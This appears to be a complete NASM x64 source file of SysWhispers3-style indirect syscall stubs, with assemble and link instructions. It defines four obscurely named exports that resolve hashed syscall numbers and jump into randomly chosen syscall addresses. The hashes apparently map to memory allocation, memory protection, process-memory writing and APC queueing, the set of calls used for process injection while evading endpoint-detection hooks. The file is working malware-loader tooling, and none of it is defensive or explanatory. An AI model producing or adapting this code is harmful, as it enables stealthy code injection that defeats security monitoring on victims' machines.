; ===============================================================
; NASM x64 version of your assembly. 
; Save as "whispers-asm.nasm", for example.
; Assemble: nasm -f win64 whispers-asm.nasm -o whispers-asm.obj
; Link: x86_64-w64-mingw32-gcc main.c whispers-asm.obj -o myprogram.exe
; ===============================================================

bits 64                 ; 64-bit code
default rel             ; Use RIP-relative addressing by default

section .text

; Export the labels so your C code can call them
global NTAVM
global NTPVM
global NTWVM
global NTQAT

; Declare external symbols (the calls to these are in your code)
extern SW3_GetSyscallNumber
extern SW3_GetRandomSyscallAddress

; ---------------------------------------------------------------------------
; NTAVM
; ---------------------------------------------------------------------------
NTAVM:
    mov [rsp + 8], rcx      ; Save registers
    mov [rsp + 16], rdx
    mov [rsp + 24], r8
    mov [rsp + 32], r9

    sub  rsp, 0x28
    mov  ecx, 0xC189CD1E    ; Load function hash into ECX
    call SW3_GetRandomSyscallAddress
    mov  r11, rax           ; Save the address of the syscall

    mov  ecx, 0xC189CD1E    ; Re-load function hash (optional)
    call SW3_GetSyscallNumber

    add  rsp, 0x28
    mov  rcx, [rsp + 8]     ; Restore registers
    mov  rdx, [rsp + 16]
    mov  r8,  [rsp + 24]
    mov  r9,  [rsp + 32]
    mov  r10, rcx
    jmp  r11                ; Jump to -> Invoke system call

; ---------------------------------------------------------------------------
; NTPVM
; ---------------------------------------------------------------------------
NTPVM:
    mov [rsp + 8], rcx
    mov [rsp + 16], rdx
    mov [rsp + 24], r8
    mov [rsp + 32], r9

    sub  rsp, 0x28
    mov  ecx, 0x159D0313    ; Load function hash
    call SW3_GetRandomSyscallAddress
    mov  r11, rax

    mov  ecx, 0x159D0313    ; Re-load function hash
    call SW3_GetSyscallNumber

    add  rsp, 0x28
    mov  rcx, [rsp + 8]
    mov  rdx, [rsp + 16]
    mov  r8,  [rsp + 24]
    mov  r9,  [rsp + 32]
    mov  r10, rcx
    jmp  r11

; ---------------------------------------------------------------------------
; NTWVM
; ---------------------------------------------------------------------------
NTWVM:
    mov [rsp + 8], rcx
    mov [rsp + 16], rdx
    mov [rsp + 24], r8
    mov [rsp + 32], r9

    sub  rsp, 0x28
    mov  ecx, 0x83179B97     ; Load function hash
    call SW3_GetRandomSyscallAddress
    mov  r11, rax

    mov  ecx, 0x83179B97
    call SW3_GetSyscallNumber

    add  rsp, 0x28
    mov  rcx, [rsp + 8]
    mov  rdx, [rsp + 16]
    mov  r8,  [rsp + 24]
    mov  r9,  [rsp + 32]
    mov  r10, rcx
    jmp  r11

; ---------------------------------------------------------------------------
; NTQAT
; ---------------------------------------------------------------------------
NTQAT:
    mov [rsp + 8], rcx
    mov [rsp + 16], rdx
    mov [rsp + 24], r8
    mov [rsp + 32], r9

    sub  rsp, 0x28
    mov  ecx, 0x88AE129F     ; Load function hash
    call SW3_GetRandomSyscallAddress
    mov  r11, rax

    mov  ecx, 0x88AE129F
    call SW3_GetSyscallNumber

    add  rsp, 0x28
    mov  rcx, [rsp + 8]
    mov  rdx, [rsp + 16]
    mov  r8,  [rsp + 24]
    mov  r9,  [rsp + 32]
    mov  r10, rcx
    jmp  r11

; End of file
